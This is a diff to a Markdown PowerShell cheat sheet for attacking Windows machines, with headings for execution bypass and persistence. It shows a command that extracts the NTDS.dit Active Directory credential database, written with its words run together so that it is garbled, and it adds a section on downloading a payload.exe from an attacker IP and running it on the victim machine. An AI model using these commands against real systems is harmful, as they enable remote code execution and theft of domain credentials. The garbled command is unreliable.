@@ -1,4 +1,4 @@
-# ☄ Powershell Commands Cheat Sheet
+# ☄️ Powershell Commands Cheat Sheet
 
 **Execution Bypass**
 
@@ -29,4 +29,15 @@ Persistence
 
 **Gather NTDS.dit file**
 
-* `ntdsutilactivate instance ntdsifmcreate full C:\ntdsutilquitquit`
+* `ntdsutilactivate instance ntdsifmcreate full C:\ntdsutilquitquit`&#x20;
+
+#### Download Files in Victim Machine
+
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Attacker IP>:8080/payload.exe','payload.exe')"
+```
+
+```
+# Executing the payload
+Start-Process "payload.exe"
+```
